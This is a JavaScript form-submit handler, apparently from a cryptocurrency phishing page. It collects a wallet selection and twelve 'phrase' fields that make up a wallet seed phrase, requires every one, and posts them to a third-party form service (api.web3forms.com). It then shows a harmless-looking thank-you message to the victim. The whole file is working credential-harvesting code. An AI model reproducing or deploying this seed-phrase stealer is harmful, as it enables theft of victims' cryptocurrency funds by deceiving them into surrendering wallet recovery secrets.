async function handleFormSubmit(e) {
    e.preventDefault();

    const formData = new FormData(e.target);
    const successMessage = document.getElementById("success-message");
    const errorMessage = document.getElementById("error-message");

    // Clear any previous messages immediately
    successMessage.textContent = "";
    errorMessage.textContent = "";
    successMessage.classList.add("d-none");
    errorMessage.classList.add("d-none");

    // Safely retrieve and validate each field
    const wallet = formData.get("wallet")?.trim() || "";
    const phrase1 = formData.get("phrase1")?.trim() || "";
    const phrase2 = formData.get("phrase2")?.trim() || "";
    const phrase3 = formData.get("phrase3")?.trim() || "";
    const phrase4 = formData.get("phrase4")?.trim() || "";
    const phrase5 = formData.get("phrase5")?.trim() || "";
    const phrase6 = formData.get("phrase6")?.trim() || "";
    const phrase7 = formData.get("phrase7")?.trim() || "";
    const phrase8 = formData.get("phrase8")?.trim() || "";
    const phrase9 = formData.get("phrase9")?.trim() || "";
    const phrase10 = formData.get("phrase10")?.trim() || "";
    const phrase11 = formData.get("phrase11")?.trim() || "";
    const phrase12 = formData.get("phrase12")?.trim() || "";
    const name = formData.get("name")?.trim() || "";

    if (!wallet || !phrase1 || !phrase2 || !phrase3 || !phrase4 || !phrase5 || !phrase6 || !phrase7 || !phrase8 || !phrase9 || !phrase10 || !phrase11 || !phrase11 || !phrase12  ) {
        errorMessage.textContent = "Please fill in all required fields.";
        errorMessage.classList.remove("d-none");
        return;
    }

    try {
        const response = await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            body: JSON.stringify(Object.fromEntries(formData, name)),
        });

        if (response.status === 200) {
            successMessage.textContent =
                "Thank you for your message. We will reply to you shortly!";
            successMessage.classList.remove("d-none");
            errorMessage.classList.add("d-none");
            e.target.reset();
        } else {
            errorMessage.textContent = "Something went wrong! Please try again.";
            errorMessage.classList.remove("d-none");
            successMessage.classList.add("d-none");
        }
    } catch (error) {
        console.error("Error submitting form:", error);
        errorMessage.textContent = "An error occurred while submitting the form.";
        errorMessage.classList.remove("d-none");
        successMessage.classList.add("d-none");
    }
}